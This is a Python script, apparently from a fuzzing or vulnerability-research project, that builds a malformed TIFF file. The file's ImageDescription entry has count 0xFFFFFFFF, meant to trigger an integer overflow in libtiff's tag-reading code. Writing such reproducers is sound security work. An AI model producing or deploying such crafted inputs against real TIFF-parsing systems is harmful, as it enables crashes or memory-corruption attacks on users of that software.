#!/usr/bin/env python3
"""
PoC generator for libtiff VULN 002:
Integer overflow in TIFFFetchNormalTag() at tif_dirread.c line 1690.

When processing a TIFF_ASCII IFD entry with tdir_count=0xFFFFFFFF,
the expression `dp->tdir_count + 1` wraps to 0 (uint32 overflow),
causing _TIFFCheckMalloc to be called with size=0.
"""
import struct
import os

out_path = "/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_dirread_c/vuln_002.tif"

# Little-endian TIFF
MAGIC = b'\x49\x49\x2A\x00'  # II + 42

# IFD offset immediately after the 8-byte header
IFD_OFFSET = 8

# Each IFD entry is 12 bytes: tag(2) + type(2) + count(4) + value_or_offset(4)
# IFD structure: num_entries(2) + entries(N*12) + next_ifd_offset(4)

# Types
TYPE_SHORT = 3
TYPE_LONG  = 4
TYPE_ASCII = 2

# We will place strip data right after the IFD.
# IFD size = 2 + (10 entries * 12) + 4 = 126 bytes
# So strip data starts at offset 8 + 126 = 134
NUM_ENTRIES = 10
IFD_SIZE = 2 + NUM_ENTRIES * 12 + 4
STRIP_OFFSET = IFD_OFFSET + IFD_SIZE  # 134

# The ImageDescription ASCII entry has count=0xFFFFFFFF; since that's
# far larger than 4 bytes, the value field is an offset into the file.
# We point it to the strip area (which has a few safe zero bytes).
IMAGEDESC_DATA_OFFSET = STRIP_OFFSET

def pack_entry(tag, typ, count, value_or_offset):
    """Pack one 12-byte IFD entry (little-endian)."""
    return struct.pack('<HHII', tag, typ, count, value_or_offset)

# Build IFD entries (must be sorted by tag ascending)
entries = b''
entries += pack_entry(0x0100, TYPE_SHORT, 1, 1)          # ImageWidth = 1
entries += pack_entry(0x0101, TYPE_SHORT, 1, 1)          # ImageLength = 1
entries += pack_entry(0x0102, TYPE_SHORT, 1, 8)          # BitsPerSample = 8
entries += pack_entry(0x0103, TYPE_SHORT, 1, 1)          # Compression = None
entries += pack_entry(0x0106, TYPE_SHORT, 1, 1)          # PhotometricInterp = BlackIsZero
# ImageDescription (ASCII) with tdir_count=0xFFFFFFFF — triggers the overflow
entries += pack_entry(0x010E, TYPE_ASCII, 0xFFFFFFFF, IMAGEDESC_DATA_OFFSET)
entries += pack_entry(0x0111, TYPE_LONG,  1, STRIP_OFFSET)   # StripOffsets
entries += pack_entry(0x0115, TYPE_SHORT, 1, 1)          # SamplesPerPixel = 1
entries += pack_entry(0x0116, TYPE_LONG,  1, 1)          # RowsPerStrip = 1
entries += pack_entry(0x0117, TYPE_LONG,  1, 1)          # StripByteCounts = 1

assert len(entries) == NUM_ENTRIES * 12, "Entry count mismatch"

# IFD block
ifd = struct.pack('<H', NUM_ENTRIES) + entries + struct.pack('<I', 0)  # next IFD = 0

# Strip data: one zero byte of pixel data
strip_data = b'\x00'

# Assemble the full file
header = MAGIC + struct.pack('<I', IFD_OFFSET)
tiff_bytes = header + ifd + strip_data

assert len(header) == 8
assert len(header) + len(ifd) == STRIP_OFFSET

with open(out_path, 'wb') as f:
    f.write(tiff_bytes)

print(f"Written {len(tiff_bytes)} bytes to {out_path}")
print(f"  IFD at offset {IFD_OFFSET}, strip data at offset {STRIP_OFFSET}")
print(f"  ImageDescription entry: type=ASCII, count=0xFFFFFFFF (triggers overflow at line 1690)")
